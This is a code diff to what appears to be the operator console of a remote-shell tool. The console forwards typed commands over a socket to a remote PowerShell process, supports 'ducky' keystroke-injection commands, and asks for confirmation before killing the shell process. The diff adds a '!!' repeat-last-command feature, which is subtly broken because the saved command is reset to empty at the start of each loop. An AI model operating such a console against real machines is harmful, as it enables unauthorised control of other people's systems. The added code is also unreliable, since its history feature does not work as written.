@@ -92,12 +92,17 @@ print("Operating System:      " + operating_system, end="")
 operating_system = operating_system.split("\n")[0]
 threading.Thread(target=recv, args=(conn,)).start()
 while not stop:
+    last = ""
     stdin = input()
     if pid in stdin:
         choice = input("[!] Are you sure you want to kill this Powershell process? Y/N >> ")
         if choice.lower()[0] != "y":
             stdin = ""
             print("[-] Aborted.")
+    if "!!" in stdin:
+        stdin = stdin.replace("!!", last)
+    if "\!" in stdin:
+        stdin = stdin.replace("\!", "!")
     if stdin.lower()[:6] == "ducky/":
         ducky_command = stdin[6:]
         if ducky_command[:4] == "help":
@@ -246,5 +251,6 @@ while not stop:
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
             stdin = ""
+    last = stdin
     conn.send((stdin + "\n").encode())
 s.close()
